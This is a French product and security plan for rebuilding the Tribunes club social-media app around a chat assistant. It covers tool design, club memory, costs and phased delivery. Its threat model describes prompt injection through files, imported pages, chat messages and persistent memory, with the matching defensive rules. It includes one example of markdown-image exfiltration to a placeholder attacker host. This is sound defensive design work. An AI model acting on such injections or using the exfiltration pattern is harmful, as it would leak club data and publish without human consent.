# Plan : refonte de Tribunes autour d'un assistant IA conversationnel

Statut : **phase 1, audit et plan. Aucun code, aucune migration.**
Rédigé le 1er novembre 2026 sur la branche `bureau` (commit `f1567a5`, Next.js 15.5.28).
Source de la demande : `docs/refonte-assistant-prompt.md` (branche `design-engine/prototype`), lu en entier.
Ce document remplace le plan de la PR #17, écrit à partir d'un prompt tronqué.

## 0. À lire d'abord : limites de ce plan

1. **`CLAUDE.md` n'existe sur aucune branche du dépôt.** Les règles citées par le prompt (pas de fausses données, pas de TODO, pas de refactor hors périmètre, workflow multi-agents) sont appliquées telles que rappelées. Seul `.claude/agents/` existe (architect, contrarian-reviewer, security-reviewer, final-reviewer).
2. **Le prompt dit « Next.js 14 »** : le dépôt est en Next.js 15.5.28 depuis la PR #13.
3. **`docs/design-engine-plan.md` n'est pas sur `main` ni sur `bureau`**, seulement sur `design-engine/prototype` (avec `brand-kit-plan.md`). Son sujet est le moteur de visuels (rendu serveur Satori). Il n'a pas été fusionné : ce plan garde le moteur de visuels actuel (Canvas navigateur) et prévoit seulement de le réutiliser.
4. **Aucune donnée d'usage réelle** (aucun utilisateur). Tous les coûts sont des **estimations** avec hypothèses explicites.
5. **Prix des modèles** repris de `lib/pricing.ts` (gpt-4o 2,50 / 10 $ le million de tokens, gpt-4o-mini 0,15 / 0,60 $), non revérifiés chez le fournisseur.
6. **Workflow suivi** : audit architect, contre-analyse contrarian-reviewer, revue security-reviewer, puis synthèse (voir §13 pour ce que les relectures ont changé).
7. Ce qui est marqué **[À CONFIRMER]** est une hypothèse, pas un fait.

## 1. Résumé exécutif

- Tribunes est aujourd'hui un **outil à formulaires** (6 vues, ~10 onglets de génération, ~4 300 lignes spécifiques tennis/padel). Une brique d'assistant existe (`DescribeIntentTab` + `/api/intent/extract`) mais c'est un pré-remplisseur de formulaire en un tour.
- Les fondations sont bonnes : génération multi-plateforme, personnalisation, publication Meta atomique, prompts anti-injection, quotas, journal d'usage.
- **Recommandation centrale** : un chat qui *prépare* et ne *publie jamais lui-même*. En lot 1, l'assistant n'a **aucun outil irréversible** : il produit des brouillons et les remet au panneau de publication existant (`PublishPanel`), donc à un clic humain déjà en place.
- **Mémoire** : on ne migre pas les champs de voix existants (`contentTone`, etc.), qui restent la source de vérité. On ajoute seulement les faits nouveaux (équipes, lieux, personnes), proposés puis confirmés d'un tap.
- **Multisport** : modèle générique **additif** (`Team`, `Fixture`), tables actuelles conservées, tennis = connecteur d'import.
- **Coût** : environ 0,03 $ par conversation aboutie ; au plafond, ~1,2 $/mois (Club 9,90 €) et ~4 $/mois (Pro 19,90 €).
- **Avant d'ouvrir des outils à un agent**, deux défauts à corriger : `FULL_AUTO` peut publier sans humain (y compris via le cron `tenup-scrape`), et le digest Telegram renvoie le même message chaque jour.
- **Lot 0 + lot 1 : ~13 à 16 jours de travail**, donc plus de 3 semaines à temps partiel. Le lot 1 est recentré sur le TCB : le chat lit le programme Ten'Up déjà importé, rédige des brouillons texte, et la publication passe par le panneau existant (§11). La mémoire arrive au lot 2.
- **Le « clic humain » n'est pas imposé par le serveur aujourd'hui** (`/api/social/publish` accepte un texte libre). Le durcir est un prérequis du lot 0 (§10.1).

## 2. Audit de l'existant

### 2.1 On garde tel quel ou presque

| Brique | Fichiers | Rôle pour l'assistant |
|---|---|---|
| Rédaction multi-plateforme | `lib/services/postGeneration.ts`, `lib/prompts/*` | Outil « rédiger » |
| Publication Meta (réservation atomique `DRAFT → PUBLISHING`) | `lib/services/publish-service.ts` | Appelée par `PublishPanel`, jamais par le modèle |
| Personnalisation | `lib/personalization.ts` (`resolvePersonalization`), `lib/voice.ts`, `lib/bannedWords.ts` | Source de vérité de la voix |
| Publication libre | `CustomPost`, `lib/prompts/custom-post.ts` | Parent des posts du chat (aucune migration de `GeneratedPost`) |
| Statut forcé en relecture | `resolveInitialStatusUnconstrained` (`lib/automation.ts`) | Règle à appliquer à tout ce que produit le chat |
| Quotas, plans, journal | `lib/quota.ts`, `lib/plans.ts`, `lib/org.ts`, `lib/usage.ts`, `lib/pricing.ts` | Contrôle et suivi des coûts |
| Uploads | `lib/uploads.ts` (magic bytes), `brandAssetStorage.ts` (bucket privé) | Pièces jointes |
| Aperçus et édition | `PostsResult.tsx`, `TextPostsPanel.tsx`, `PublishPanel.tsx`, `VisualGenerator.tsx`, `PostVisualEditor.tsx`, `PersonalizePostPanel.tsx` | Cartes du chat |
| SDK OpenAI, Zod | `openai@6`, `zod@3` | **Aucune nouvelle dépendance** |

### 2.2 On adapte

- `lib/openai.ts` et les modèles codés en dur (12 emplacements trouvés sous `app/`, à recompter dans `lib/`) : constantes centralisées `lib/ai/models.ts`.
- `lib/pricing.ts` : un modèle inconnu retombe aujourd'hui sur les tarifs gpt-4o. Il doit échouer bruyamment.
- `lib/quota.ts` : comptage puis action, non atomique. Vision comptée comme `ai_generation` (un club Gratuit peut brûler ses 3 générations en lisant des captures).
- `lib/sports.ts` : vocabulaire pour 5 sports seulement (Football, Tennis, Basketball, Volleyball, Handball). Rugby, Badminton et Autre n'en ont pas.
- `app/dashboard/DashboardClient.tsx` : navigation par état `view` (6 entrées, l.138-149), pas par route.
- `cron/telegram-digest` : refondre (voir §7).
- `cron/tenup-scrape` : l'aligner sur `resolveInitialStatusUnconstrained` (il utilise `resolveInitialStatus` et peut publier en `FULL_AUTO`).
- `cron/cleanup-posts` : supprime les brouillons de plus de 30 jours, y compris ceux du chat. À exclure ou à prévenir.

### 2.3 On gèle ou on jette

- **Gelé** (pas supprimé avant décision du PDG) : tout le flux tennis/padel (`app/dashboard/posts/*`, `app/api/posts/tennis/*`, `tenup-scraper.ts`, `fft-pdf-parser.ts`, tables `TenupSchedule`, `TournamentSchedule`, `WeeklySchedule`). ScrapingBee coûte ~0,005 $ par récupération.
- **À jeter plus tard** : `DescribeIntentTab` et `/api/intent/extract` (remplacés par le chat), `OnboardingWizard` (remplacé par l'onboarding conversationnel), une fois le chat validé par de vrais clubs.

### 2.4 Dette constatée, par gravité

1. **Isolation par club fondée sur la discipline des routes.** Pas de `middleware.ts`, pas de `clubId` sur `GeneratedPost` (l'appartenance passe par 9 relations parentes, `clubOwnershipOr` dans `lib/postTypes.ts`), 11 fichiers de tests, tous sur de la logique pure, **zéro test de route**.
2. **`FULL_AUTO` publie sans humain** (`lib/automation.ts` l.78-82), aussi depuis `tenup-scrape`.
3. **Un utilisateur = un club** (`Club.userId @unique`). Le multi-admin / multi-section du plan Pro semble non servi par les routes. Non audité en profondeur : **[À CONFIRMER]**.
4. Quota non atomique ; vision comptée comme génération.
5. Digest Telegram sans dédoublonnage (voir §7).
6. `lib/openai.ts` instancie le client à l'import (le build échoue sans clé) ; correctif sur `agent/1-audit-lancement`, non fusionné.
7. Lint non configuré (issue #4).

## 3. Architecture de l'agent

### 3.1 Boucle

```
Navigateur (chat)
  │ POST /api/assistant/messages   (session Supabase, flux SSE)
  ▼
1. Auth + contexte {clubId, orgId, userId, plan} issu de la session SEULE
2. Quota + budget (réservation atomique)
3. Charge : résumé de mémoire (≤ ~800 tokens) + 12 derniers messages
  ▼
Boucle (max 5 appels modèle et 3 appels d'outils par tour)
  modèle « routeur » (petit) : répondre | appeler un outil | poser une question
  Exécuteur : liste fermée → Zod strict → contexte serveur
  ▼
UsageEvent par appel modèle
```

- **Boucle maison sur le SDK OpenAI** (`chat.completions` avec `tools`), sans framework d'agent : pas de dépendance, comportement lisible et testable.
- **Streaming** par SSE depuis une route Next standard. `maxDuration` à fixer ; dépend du plan Vercel **[À CONFIRMER]**.
- **Le modèle ne reçoit aucun secret** (jetons Meta, clés, ids d'autres clubs).
- **Contexte** : résumé de mémoire construit par du **code déterministe** (pas par le modèle), plus les 12 derniers messages. Au-delà, un résumé de conversation est généré par le petit modèle une fois, puis stocké.
- **Stockage** : `AssistantConversation` et `AssistantMessage` (§3.3).
- **Reprise sur erreur** : chaque tour est enregistré avant l'appel modèle ; en cas de coupure, le client recharge la conversation et peut relancer le dernier message. Un appel d'outil est idempotent par construction en lot 1 (brouillons uniquement). Un tour qui échoue ne débite pas de quota de publication.

### 3.2 Principe de sécurité structurant

Les règles ne dépendent pas du prompt. Même si le modèle obéit à une injection, il ne peut qu'appeler un outil de la liste fermée, et aucun outil du lot 1 ne publie, supprime ou envoie.

### 3.3 Modèle de données conversationnel (proposé, non migré)

```prisma
model AssistantConversation {
  id         String   @id @default(cuid())
  clubId     String
  club       Club     @relation(fields: [clubId], references: [id], onDelete: Cascade)
  userId     String
  title      String?
  summary    String?            // résumé des anciens messages
  costMicros Int      @default(0)
  status     String   @default("ACTIVE") // ACTIVE | ARCHIVED
  createdAt  DateTime @default(now())
  updatedAt  DateTime @updatedAt
  messages   AssistantMessage[]
  @@index([clubId, updatedAt])
}

model AssistantMessage {
  id             String   @id @default(cuid())
  conversationId String
  conversation   AssistantConversation @relation(fields: [conversationId], references: [id], onDelete: Cascade)
  role           String   // USER | ASSISTANT | TOOL
  content        Json     // parties : texte, appel d'outil, carte, pièce jointe
  model          String?
  tokensIn       Int?
  tokensOut      Int?
  createdAt      DateTime @default(now())
  @@index([conversationId, createdAt])
}
// UsageEvent : + conversationId String?, + costMicros Int?, @@index([clubId, kind, createdAt])
```

`AssistantAction` (confirmation serveur d'actions irréversibles) n'arrive **qu'au lot 4** (§11).

## 4. Outils V1

Tous : schéma Zod `.strict()`, bornes de longueur, **aucun paramètre `clubId`, `orgId` ou `userId`**, accès Prisma par `where: { id, clubId: ctx.clubId }`, ressource d'un autre club ⇒ 404 identique à « inexistant ».

| Outil | Rôle | Arguments | Contrôles | Code réutilisé | Lot |
|---|---|---|---|---|---|
| `get_club_memory` | Lire la mémoire confirmée | `topics[]` | filtre `clubId` du contexte | nouveau service `memory` | 2 |
| `list_recent_posts` | Derniers brouillons/publiés (≤ 10) | `limit` | `clubOwnershipOr` | `lib/postTypes.ts` | 2 |
| `get_week_schedule` | Lire le programme de la semaine (données tennis du TCB) | `from`, `to` (≤ 14 j) | filtre `clubId` | `WeeklySchedule`, `TenupSchedule` | 1 |
| `get_connections_status` | Réseaux connectés, sans jeton | aucun | `select` explicite sans `accessToken` | modèle `SocialConnection` | 2 |
| `create_post_draft` | Rédiger un brouillon | `objective`, `subject`, `keyInformation[]` (≤ 200 car. chacun, ≤ 10), plateformes | quota, mots interdits, statut forcé en relecture (jamais `FULL_AUTO`) | service `createCustomPostDraft` à extraire de `app/api/posts/custom-post/route.ts`, puis `generatePlatformPosts` | 1 |
| `revise_post_draft` | Reformuler un brouillon | `postId`, `instruction` | `where: { id, clubId }`, brouillon uniquement | `postGeneration.ts` | 1 |
| `propose_memory_update` | Proposer des faits à retenir | `items[]` (≤ 10) | crée du `PROPOSED`, jamais `CONFIRMED` ; interdit dans un tour qui a lu une pièce jointe ou un import | nouveau | 2 |
| `search_calendar` | Lire les rencontres/événements | `from`, `to` (≤ 90 j) | filtre `clubId` | `Fixture` | 2 |
| `propose_calendar_event` | Proposer un événement | champs `Fixture` | `PROPOSED` | `Fixture` | 2 |
| `read_attachment` | Extraire des **faits** d'un fichier | `attachmentId` | pièce du club, ≤ 5 Mo, extracteur **sans outils** | `lib/uploads.ts`, vision | 3 |
| `request_publish` | Demander une publication | `postId`, `connectionIds` | crée une `AssistantAction` PENDING ; exécution par route de confirmation | `publish-service.ts` | 4 |
| `request_delete` | Demander une suppression | `kind`, `id` | idem | — | 4 |

**Exclus volontairement** : e-mails, messages Telegram initiés par le modèle, paiement, membres, plan, connexions Meta, journaux d'audit, exécution de code, navigation web libre.

**Au lot 1, la publication se fait hors du chat-agent** : la carte du post affiche `PublishPanel`, et le bénévole clique. Le modèle n'a pas de chemin vers `publish-service.ts`. Le serveur doit toutefois imposer ce clic (voir §10.1, correctifs C1 à C5).

## 5. Mémoire du club

### 5.1 Principe

- **Les champs de voix existants ne migrent pas** : `Club.contentTone`, `customInstructions` (1 000 car.), `bannedWords`, `signaturePhrase`, `ClubPersonalizationOverride`, `ClubBrandAsset`. `resolvePersonalization` est déjà branchée sur toutes les routes de génération ; les déplacer casserait ce lien pour un gain faible.
- **Le chat les lit et les modifie via les mêmes validateurs** (`validateClubPersonalizationInput`) et écrit dans `ClubPersonalizationHistory` : retour arrière possible.
- **On ajoute seulement les faits nouveaux** dans `ClubMemoryItem` : équipes, lieux, personnes, faits durables.

```prisma
model ClubMemoryItem {
  id              String   @id @default(cuid())
  clubId          String
  club            Club     @relation(fields: [clubId], references: [id], onDelete: Cascade)
  kind            String   // TEAM | VENUE | PERSON | FACT
  value           Json     // validé par un schéma Zod par kind
  status          String   @default("PROPOSED") // PROPOSED | CONFIRMED | ARCHIVED
  source          String   // USER_CHAT | ATTACHMENT | IMPORT | SETTINGS
  sourceMessageId String?
  createdAt       DateTime @default(now())
  updatedAt       DateTime @updatedAt
  @@index([clubId, kind, status])
}
```

La table arrive au lot 2 (pas de mémoire structurée en lot 1). Une fois `Team` créée (§6), `TEAM` et `VENUE` s'y réfèrent.

### 5.2 Construction

- **Onboarding conversationnel** : 3 questions (sport et équipes, où vous jouez, comment vous parlez à vos membres). Amorçage unique depuis `Club.name`, `Club.sport`, `clubProfile.city` et `story` (le profil ne contient que ces deux champs, `lib/clubProfile.ts`), en `PROPOSED`.
- **Apprentissage par corrections** : quand le bénévole corrige (« trop formel », « on dit nos Bleus »), l'assistant propose une carte « Je retiens : on dit toujours *nos Bleus*. OK ? ». Un tap = `CONFIRMED`. Une consigne de ton rejoint `customInstructions` (même validateur, même limite).
- **Règle dure** : seule une action utilisateur passe `PROPOSED → CONFIRMED`, par une route dédiée, jamais par un outil. Toute entrée venue d'un fichier ou d'un import reste `PROPOSED`.

### 5.3 Ce que voit l'utilisateur

Écran « Ce que Tribunes sait de mon club » (remplace la vue Personnalisation en lot 2) : liste en phrases, bouton Corriger / Oublier, provenance (« dit le 12 octobre dans le chat »), propositions en attente en haut. Suppression = archivage 30 jours.

### 5.4 Personnes et mineurs

Seuls prénom et rôle sont stockés. Un champ `publicConsent` conditionne la mention d'une personne dans un post ; si absent, l'assistant demande. Le résumé envoyé au modèle n'inclut que les personnes avec consentement.

## 6. Généralisation multisport

### 6.1 Constat (`prisma/schema.prisma`)

`Club.sport` est une chaîne libre ; l'enum `Sport` (TENNIS, PADEL…) n'est utilisé que par `TournamentSchedule` et `WeeklySchedule`. La notion de rencontre est éclatée entre `MatchResult` (8 colonnes tennis mélangées au reste), `MatchAnnouncement` (doublon), `TournamentSchedule`, `WeeklySchedule`, plus `TenupSchedule` (cache de scrape JSON).

### 6.2 Modèle générique additif

```prisma
model Team {
  id       String @id @default(cuid())
  clubId   String
  name     String
  sport    String
  category String?
  @@index([clubId])
}

model Fixture {            // rencontre ou événement
  id          String   @id @default(cuid())
  clubId      String
  teamId      String?
  kind        String   // MATCH | TOURNAMENT | TRAINING | EVENT
  title       String?
  startsAt    DateTime
  opponent    String?
  venue       String?
  competition String?
  isHome      Boolean?
  status      String   @default("PROPOSED") // PROPOSED | CONFIRMED | CANCELLED | PLAYED
  result      Json?    // score, validé par un schéma Zod par sport (cf. SportExtra de lib/sports.ts)
  source      String   // USER_CHAT | ATTACHMENT | IMPORT
  @@index([clubId, startsAt])
}
```

`Person` n'est pas créée : les personnes restent des entrées `ClubMemoryItem` de type `PERSON` (un seul endroit, un seul consentement).

### 6.3 Migration (additive, réversible, en 4 temps)

1. Créer `Team` et `Fixture`. Ajouter un `fixtureId?` nullable sur `MatchResult` et `MatchAnnouncement`.
2. Double écriture dans les routes de génération concernées.
3. Backfill de `MatchResult` (adversaire, date, domicile, compétition, scores ; colonnes tennis et `extraData` vers `result`) et de `MatchAnnouncement`. **Contrôle de comptes avant/après.** Le volume de données de production est inconnu : le dépôt n'est pas déployé, probablement quasi nul **[À CONFIRMER]**.
4. On ne touche ni à `GeneratedPost` ni à `postType`, et le registre `lib/postTypes.ts` (qui porte l'isolation) reste inchangé.

**Rejeté** : remplacer d'un coup les 8 tables par `Fixture` (toutes les routes de génération et le registre d'isolation changent ; risque élevé pour un produit sans utilisateur).

### 6.4 Tennis = un connecteur

`TenupSchedule`, `TournamentSchedule`, `WeeklySchedule` restent des modules d'import. Un outil `import_tenup_schedule` (lot 5) lit ces sources, produit des `Fixture` en `PROPOSED`, comme lecture externe non fiable (§10). Ajouter les vocabulaires Rugby, Badminton, Autre dans `lib/sports.ts`.

## 7. Proactivité

### 7.1 État actuel

`vercel.json` : 5 crons quotidiens (04h `cleanup-posts`, 05h `tenup-scrape`, 06h `telegram-digest`, 07h `social-token-refresh`, 08h `publish-retry`), tous protégés par `CRON_SECRET`. Le digest envoie « N posts en attente » aux clubs avec `telegramChatId`, **sans écrire de `TelegramMessage` de kind `digest`** : même message chaque jour tant que des posts attendent. Le webhook Telegram ne traite que `/start` et les boutons `pub:` / `rej:`.

### 7.2 Proposition : un briefing, déterministe, sans IA

- **Remplacer** le digest par un « briefing » quotidien : lit `Fixture` (rencontres des 7 prochains jours), brouillons en attente, connexions à reconnecter. **Aucun appel modèle dans le cron.**
- **Anti-spam** : table `ProactiveNotice(clubId, key, sentAt)`. Même `key` (ex. `fixture:<id>:affiche`) jamais renvoyée ; rien d'envoyé s'il n'y a rien de nouveau ; **maximum 3 messages par semaine et par club** ; pause automatique si trois messages restent sans réponse. Les alertes d'échec de publication (`notifyPublishFailed`) restent immédiates, hors plafond.
- **Dans le chat** : à l'ouverture, une suggestion issue des mêmes données (« ce week-end : 3 matchs et la soirée du club, je prépare les affiches ? »), construite par code. Le modèle n'est appelé que quand le bénévole accepte.
- **Fréquence** : quotidienne seulement. Une cadence plus fine dépend du plan Vercel **[À CONFIRMER]**.
- **Coût** : 0 $ en IA pour la détection ; une préparation acceptée coûte comme une conversation (~0,03 $). Pas de génération automatique de brouillons par cron en lot 1 à 3.
- **Prérequis** : aligner `tenup-scrape` sur `resolveInitialStatusUnconstrained`.

## 8. Interface chat

- **Place** : une vue `assistant` ajoutée en tête du `NAV` de `DashboardClient.tsx`, derrière un drapeau, à côté de l'existant. Elle devient la vue par défaut au lot 5, après validation par de vrais clubs.
- **Écran** : fil de discussion, champ de saisie en bas, 3 à 4 suggestions cliquables au démarrage (« J'annonce un match », « Je remercie un bénévole », « Je prépare la semaine »). Pas de jargon, un seul réglage de ton.
- **Cartes dans le fil** : lot 1 = texte du brouillon + `PublishPanel` sans visuel (`getImageBlob` renvoie `null`, comme `TextPostsPanel`). `PostsResult` exige un `MatchData` avec score et n'est pas réutilisable pour une annonce. Lot 2 et après : visuel (`VisualGenerator`, `PostVisualEditor`, à adapter) et carte « Je retiens… » (nouvelle).
- **Validation en un clic** : bouton « Publier » du `PublishPanel`, qui doit afficher `post.content` exact et les réseaux visés (à vérifier, non relu en entier). Le modèle ne peut pas le cliquer.
- **Rendu sûr** : liste blanche de balises et de protocoles, `rel=noopener`, **aucune image distante** (canal classique d'exfiltration par injection : `![](https://attaquant/?d=…)`).
- **Raccourcis** : « Générer du contenu » et ses onglets passent en « Mode manuel » (bouton secondaire). Historique et Réseaux inchangés. Personnalisation devient « Ce que Tribunes sait de mon club ».
- **Mobile** : saisie en bas, navigation réduite pendant la saisie (la barre actuelle est horizontale).
- **Visuels** : lot 1 = moteur actuel. Le moteur de rendu serveur de `design-engine/prototype` est hors périmètre ; le brancher plus tard ne change pas le chat (la carte visuel appelle un générateur).

## 9. Coûts IA

> **Estimations, pas mesures.** Tokens supposés, prix de `lib/pricing.ts` non revérifiés, sans cache de prompt. Dollars comparés aux euros sans conversion.

### 9.1 Coût unitaire

| Tâche | Modèle | Tokens in / out | Coût |
|---|---|---|---|
| Appel de dialogue / routage | gpt-4o-mini | 3 500 / 400 | 0,00077 $ |
| Rédaction d'un post (2 plateformes) | gpt-4o | 2 500 / 700 | 0,0133 $ |
| Extraction de mémoire | gpt-4o-mini | 4 000 / 500 | 0,0009 $ |
| Lecture d'une capture | gpt-4o (vision) | 1 500 / 300 | ~0,007 $ |

### 9.2 Par conversation

Conversation type (8 messages, 1,5 appel de dialogue par message, 1,5 rédaction, 1 extraction) : 0,0092 + 0,0199 + 0,0009 ≈ **0,030 $**. Si le dialogue tournait sur le gros modèle : ≈ 0,17 $, soit 5 à 6 fois plus.

### 9.3 Par mois et par plan, quotas recommandés

| | Gratuit | Club (9,90 €) | Pro (19,90 €) |
|---|---|---|---|
| Publications produites / mois | 3 (inchangé) | 60 | 200 |
| Messages de chat / mois | 30 | 300 | 1 000 |
| Lectures de captures / mois | 0 | 10 | 40 |
| **Coût au plafond** | ≈ 0,07 $ | ≈ 1,2 $ | ≈ 4,1 $ |
| Part du prix | coût d'acquisition | ≈ 12 % | ≈ 21 % |
| Usage réaliste | 2 conv. ≈ 0,06 $ | 12 conv. ≈ 0,36 $ | 30 conv. ≈ 0,9 $ |

Avant frais Stripe, hébergement et Meta, non chiffrés. « Illimité » dans `lib/plans.ts` devient « plafond d'usage raisonnable » côté assistant : à reformuler dans l'offre et les CGV.

### 9.4 Modèle par tâche

Petit modèle : dialogue, routage, extraction. Gros modèle : rédaction (qualité du français) et vision. Escalade du dialogue vers le gros modèle seulement après deux échecs d'arguments valides, 1 fois par conversation. Les identifiants de modèle deviennent des constantes centralisées (`ROUTER`, `WRITER`, `VISION`). **Benchmark de 3 à 4 modèles sur 20 cas réels avant le lot 2** ; aucun modèle plus récent n'est recommandé sans mesure.

### 9.5 Contrôles côté serveur

1. Plafonds du plan vérifiés avant chaque tour, comptés sur l'**organisation** (comme `lib/quota.ts`).
2. **Réservation atomique** : `UsageEvent` inséré en transaction avant l'appel, complété après. Livrée au lot 0 (la boucle de 5 appels par tour rend la course de `checkAiQuota` exploitable).
3. Budget par conversation : arrêt à 0,25 $ cumulés (`costMicros`).
4. 5 appels modèle et 3 appels d'outils max par tour ; historique tronqué à 12 messages + résumé ; `max_tokens` plafonnés ; entrée ≤ 2 000 caractères.
5. Tableau admin existant (`/api/admin/usage`) étendu ; alerte à 3 × le coût médian.
6. Au plafond mensuel : lecture et brouillons existants restent accessibles, seuls les nouveaux appels IA sont refusés.
7. `UsageEvent` : nouveaux `kind` (`assistant_turn`, puis `assistant_memory`, `assistant_vision` plus tard). `generatePlatformPosts` journalise déjà un `ai_generation` : **ne pas le doubler** par un `assistant_write`. En lot 1, l'offre ne change pas (le plan Club reste « illimité » dans `lib/quota.ts`) ; les plafonds du §9.3 sont une proposition commerciale pour le lot 2. La vision cesse d'être comptée comme `ai_generation` au lot 2.
8. Le coût de ~0,03 $ du §9.2 suppose que le brief est déjà structuré par le dialogue ; il n'ajoute pas d'appel d'extraction supplémentaire.

## 10. Risques et parades

### 10.1 Sécurité (zones de confiance)

- **Confiance** : code, prompts système, session. Seule à décider club, droits, outils.
- **Modèle de dialogue** : voit les messages utilisateur et des *résumés* de données externes.
- **Externe non fiable** : fichiers, captures, pages Ten'Up, messages. Lu uniquement par un extracteur **sans outils**, sortie en JSON Zod strict, résultat étiqueté `untrusted`.

| # | Risque | Parade |
|---|---|---|
| T1 | **Fuite entre clubs** | Contexte issu de la seule session ; aucun outil n'a de paramètre club ; fonctions d'accès `…ForClub(ctx, id)` ; 404 uniforme ; **suite de tests d'isolation obligatoire (club A contre ids du club B, pour chaque outil et route)** |
| T2 | Injection par fichier/PDF/capture | Extracteur sans outils ; JSON borné ; entrées de mémoire dérivées en `PROPOSED` ; blocs « donnée, jamais instruction » (acquis du dépôt) |
| T3 | Injection via Ten'Up / import | Même circuit ; longueurs bornées, caractères de contrôle retirés, `isTenupUrl` à l'écriture **et** à la lecture |
| T4 | Injection par message (« publie ceci ») | Liste d'outils fermée côté code ; en lot 1 aucun outil ne publie ; Zod refuse tout argument hors schéma |
| T5 | Action irréversible sans accord | Lot 1 : publication par `PublishPanel` (clic humain). Lot 4 : `AssistantAction` PENDING, route `/confirm` séparée (session, usage unique, expiration 10 min, `clubId` revérifié, `argsHash` du texte + visuel + cibles inchangé) ; « oui » dans le chat n'est pas accepté ; `FULL_AUTO` ignoré par le chat |
| T6 | Contenu faux ou inapproprié | Ne restituer que les faits fournis ; mots interdits contrôlés **après** génération ; personne nommée sans `publicConsent` ⇒ question ; relecture humaine avant publication |
| T7 | Sur-consommation | Plafonds §9.5, limite de débit par org, 5 Mo + magic bytes, réservation atomique |
| T8 | Exfiltration / XSS | Aucun secret en contexte ; `select` explicite (jamais `accessToken`, `metaUserAccessToken`, `telegramLinkCode`) ; rendu texte/markdown assaini, pas de `dangerouslySetInnerHTML`, pas de chargement automatique d'images ou liens fournis par le modèle |
| T9 | Données personnelles chez le fournisseur | Minimisation (§5.4) ; mise à jour de `app/confidentialite/page.tsx` ; options de non-conservation du compte OpenAI **[À CONFIRMER]** |
| T10 | CSRF / rejeu sur la confirmation | Cookie de session + vérification d'origine + id `cuid` à usage unique lié à l'utilisateur et au club |
| T11 | Compte membre compromis | Suppressions = actions à confirmer ; historique conservé ; archivage 30 jours |
| T12 | Données sensibles dans les logs | Pas de contenu de message en console ; `meta` des `UsageEvent` limité aux ids et compteurs |
| T13 | **Tokens Meta** | Jamais dans le contexte ni dans un `select` d'outil ; publication uniquement via `publish-service.ts` appelé par la route humaine |
| T14 | **Cron qui publie** | `tenup-scrape` aligné sur `resolveInitialStatusUnconstrained` avant lot 1 (C1) |
| T15 | **Le clic humain n'est pas imposé par le serveur** | `/api/social/publish` accepte un texte libre sans `generatedPostId` : correctifs C2 au lot 0 ; jeton de confirmation à usage unique pour les posts du chat dès le lot 4 |
| T16 | **Mémoire = injection persistante** | `customInstructions` est ajouté à tous les prompts, y compris ceux des crons `FULL_AUTO`. La carte « Je retiens » affiche la **valeur exacte** stockée, pas la paraphrase du modèle ; un tour ayant lu une pièce jointe, une page Ten'Up ou un import ne peut pas proposer de consigne ; une entrée confirmée est citée comme donnée délimitée, jamais comme instruction |
| T17 | **SSE** | Abandon du client géré, une seule requête de chat à la fois par club, tour interrompu enregistré, aucun outil exécuté deux fois |
| T18 | **URL pilotée par le modèle** | Aucun fetch serveur sur une URL fournie par le modèle ou l'utilisateur, sauf `isTenupUrl` |

À vérifier à la main avant le lot 1 : politiques RLS du bucket `club-assets` (écriture dans `published/`), attributs `SameSite`/`Secure` des cookies Supabase, contenu réel affiché par `PublishPanel`.

**Tests de sécurité (critères d'acceptation, bloquants pour la fusion de chaque lot concerné)** : pour chaque outil, ids d'un autre club rejetés sans fuite ; `clubId` injecté dans les args refusé ; ≥ 15 prompts d'injection (FR/EN, dont fichiers piégés) sans mémoire `CONFIRMED` ni action exécutée ; quota sous 20 requêtes parallèles ; club `FULL_AUTO` jamais publié sans clic.

### 10.2 Produit

| Risque | Parade |
|---|---|
| Chat vide effrayant pour un bénévole | Suggestions cliquables, onboarding en 3 questions |
| Qualité du français du petit modèle | Benchmark avant lot 2, escalade bornée |
| Mémoire polluée (erreurs, injection) | `PROPOSED`, provenance, écran de correction |
| Régression en retirant les formulaires | « Mode manuel » conservé, retrait seulement au lot 5 |
| Spam de notifications | §7 : dédoublonnage, plafond hebdomadaire, pause automatique |
| Aucun utilisateur réel | Valider avec le TCB (lot 1) puis 3 à 5 clubs avant les lots 3 à 5 |
| **RGPD** : noms de joueurs/mineurs chez un sous-traitant US | Minimisation, consentement, droit d'effacement via l'écran mémoire, **avis juridique recommandé** (non fourni ici) |

### 10.3 Technique

| Risque | Parade |
|---|---|
| Dette de test (0 test de route) | Tests d'isolation au lot 0 ; règle « un outil = un test d'isolation » |
| Backfill `MatchResult` | Contrôle de comptes, migration additive, réversible |
| Brouillons du chat supprimés à 30 jours | Exclusion dans `cleanup-posts` ou prévenir le club |
| Build cassé sans clé (`lib/openai.ts`) | Reprendre le correctif de `agent/1-audit-lancement` |
| Dépendance à un fournisseur | Constantes de modèles centralisées ; pas de changement de fournisseur proposé (nouveau SDK, français, vision, outils et confidentialité à réévaluer) |
| Durée de fonction Vercel pour le streaming | À valider avant lot 1 |

## 11. Découpage en lots

Chaque lot est livrable seul, une PR par tâche. Les durées sont indicatives, non validées. **Aucun lot ne démarre sans votre accord.**

### Lot 0 : fondations et correctifs de sécurité (aucun changement d'écran), ~5 à 6 j
- `lib/ai/models.ts` : modèles et prix centralisés, erreur sur modèle inconnu. `lib/openai.ts` paresseux (correctif de `agent/1-audit-lancement`).
- **C1** `tenup-scrape` aligné sur `resolveInitialStatusUnconstrained` (T14), avec test : un match scrapé contenant « publie » ne produit que `PENDING_REVIEW`, zéro appel Meta.
- **C2** `POST /api/social/publish` : exiger `generatedPostId`, publier `post.content` (pas `text`), refuser un `connection.provider` qui ne correspond pas à `post.platform`, contrôle `Origin`.
- **C3** Images : appliquer `validateImageUpload` à `social/publish` et `vision/extract-match` ; réserver le post après l'upload (ou rétablir le statut en cas d'échec).
- **C4** `cron/publish-retry` : se fonder sur l'heure de passage en `PUBLISHING` (nouveau champ ou `updatedAt`), pas sur `createdAt`, sinon double publication d'un brouillon de chat ancien.
- **C5** CSP et `frame-ancestors` dans `next.config.mjs` ; contrôle `Origin` et `Content-Type: application/json` strict sur la route SSE.
- Réservation atomique de quota.
- `lib/club-context.ts` : `getClubContext()` depuis la session.
- Tests d'isolation sur les routes que le chat appellera.
- Retirer les logs « DEBUG TEMPORAIRE » du callback Meta (`social/meta/callback/route.ts`) ; `crypto.randomBytes` pour le code de liaison Telegram.

### Lot 1 : le TCB produit ses publications de la semaine par le chat, ~10 à 12 j
Objectif : un bénévole du TCB ouvre le chat, dit « annonce les matchs de la semaine », l'assistant **lit le programme Ten'Up/FFT déjà importé**, rédige les brouillons, le bénévole les retouche en phrases et **clique sur Publier dans le panneau existant**.
- Vérifier la durée de fonction Vercel **le premier jour** ; repli sans streaming (réponse complète) si la limite est trop courte.
